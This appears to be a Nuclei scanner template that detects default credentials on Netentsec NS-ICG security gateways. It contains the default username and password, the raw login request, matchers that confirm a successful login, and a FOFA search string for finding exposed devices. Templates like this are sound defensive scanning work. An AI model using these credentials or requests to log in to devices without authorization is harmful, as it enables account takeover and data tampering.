http:
- attack: pitchfork
  matchers:
  - condition: and
    dsl:
    - contains(header_1, "/user/main/")
    - status_code_1 == 302
    - status_code_2 == 200
    - contains(body_2, "var loguser = \'ns25000")
    type: dsl
  payloads:
    password:
    - ns25000
    username:
    - ns25000
  raw:
  - '@timeout: 25s

    POST /user/login/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    usrname={{username}}&pass={{password}}&signinfo=&ukey_user_flag=0&SlotSerialNumber=&agree=

    '
  - '@timeout: 25s

    GET /user/main HTTP/1.1

    Host: {{Hostname}}

    Referer: {{BaseURL}}/user/login/

    '
id: nsicg-default-login
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:netentsec:application_security_gateway:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: 'Netentsec NS-ICG contains a default login vulnerability. An attacker
    can obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.

    '
  metadata:
    fofa-query: NS-ICG
    max-request: 2
    product: application_security_gateway
    vendor: netentsec
    verified: true
  name: Netentsec NS-ICG - Default Login
  reference:
  - https://www.cnvd.org.cn/flaw/show/CNVD-2016-08603
  severity: high
  tags: nsicg,default-login,vuln
